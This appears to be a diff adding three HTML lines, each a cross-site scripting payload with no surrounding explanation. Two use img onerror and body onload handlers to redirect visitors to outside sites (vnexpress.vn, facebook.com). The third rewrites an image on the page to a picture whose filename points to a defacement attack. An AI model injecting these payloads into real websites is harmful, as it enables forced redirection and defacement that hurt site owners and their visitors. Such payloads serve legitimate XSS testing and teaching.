@@ -1,0 +1,3 @@
+<img src=x onerror="location.replace('https://vnexpress.vn')">
+<body onload="location.replace('https://facebook.com')"> abc </body>
+<img src=x onerror='document.querySelector("body > div.container > div:nth-child(2) > img").src="https://images.fpt.shop/unsafe/filters:quality(90)/fptshop.com.vn/uploads/images/tin-tuc/149172/Originals/tan-cong-deface-la-gi.png"' >
